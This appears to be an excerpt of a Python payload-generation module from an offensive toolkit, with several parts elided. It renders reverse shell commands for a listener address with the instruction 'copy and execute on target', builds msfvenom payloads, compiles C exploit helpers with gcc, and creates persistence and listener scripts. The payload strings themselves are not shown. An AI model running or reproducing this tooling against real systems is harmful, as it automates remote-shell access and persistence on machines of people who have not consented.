...
"""
Payload generation module for reverse shells, staged artifacts, and helpers.
"""
...
def generate_reverse_shells(lhost, lport):
    """Generate reverse shell variants."""
    os.makedirs("payloads", exist_ok=True)

    shells_file = "payloads/reverse_shells.txt"
    with open(shells_file, "w") as handle:
        handle.write(f"{'=' * 60}\n")
        handle.write(f"Reverse Shell Payloads - {lhost}:{lport}\n")
        handle.write(f"{'=' * 60}\n\n")

        for shell_type, payload in REVERSE_SHELLS.items():
            rendered = payload.format(lhost=lhost, lport=lport)
            handle.write(f"[{shell_type.upper()}]\n")
            handle.write(f"Command: {rendered}\n")
            handle.write("Usage: copy and execute on target\n\n")

    logger.info(f"Reverse shells saved: {shells_file}")

    print("\n" + "=" * 70)
    print("PAYLOAD CATALOG".center(70))
    print("=" * 70)
    for shell_type, payload in REVERSE_SHELLS.items():
        rendered = payload.format(lhost=lhost, lport=lport)
        print(f"\n[{shell_type.upper()}]")
    ...
    for payload_type, format_type, output_file in payloads:
        try:
            cmd = [
                ...
                format_type,
                "-o",
                f"payloads/{output_file}",
            ]
            print(f"[+] Generating {output_file}...")
            subprocess.run(cmd, check=True, capture_output=True)
            logger.info(f"Generated: payloads/{output_file}")
        except FileNotFoundError:
            logger.warning("msfvenom not found")
        except subprocess.CalledProcessError as exc:
            logger.warning(f"msfvenom failed: {exc}")


def compile_c_exploits():
    """Compile C-based local helpers."""
    ...
    for exploit_name, exploit_code in EXPLOITS_C.items():
        ...
        try:
            with open(c_file, "w") as handle:
                handle.write(exploit_code)

            print(f"[+] Compiling {exploit_name}...")
            subprocess.run(["gcc", c_file, "-o", bin_file, "-pthread"], check=True, capture_output=True)
...
def create_persistence_scripts(lhost, lport):
    """Create persistence helper scripts."""
...
"""
    ...
    with open(listener_file, "w") as handle:
        handle.write(listener_content)
...
def run(target, lhost, lport=4444):
    """Module entrypoint."""
    print(f"\n{'=' * 70}")
    print("PAYLOAD GENERATION MODULE".center(70))
    print("=" * 70)
    print(f"Target:   {target}")
    print(f"Listener: {lhost}:{lport}\n")

    logger.info(f"Generating payload artifacts for {lhost}:{lport}")

    print("\n[*] Generating reverse shell catalog...")
    generate_reverse_shells(lhost, lport)

    print("\n[*] Generating msfvenom artifacts...")
    generate_msfvenom_payloads(lhost, lport)

    print("\n[*] Compiling local helpers...")
    compile_c_exploits()

    print("\n[*] Creating persistence helpers...")
    create_persistence_scripts(lhost, lport)

    print("\n[*] Generating listener setup...")
    generate_listener_script(lhost, lport)

    print("\n" + "=" * 70)
    print("ARTIFACT GENERATION COMPLETE".center(70))
    print("=" * 70)
    print(f"Payloads: {os.path.abspath('payloads/')}")
    print(f"Exploits: {os.path.abspath('exploits/')}")
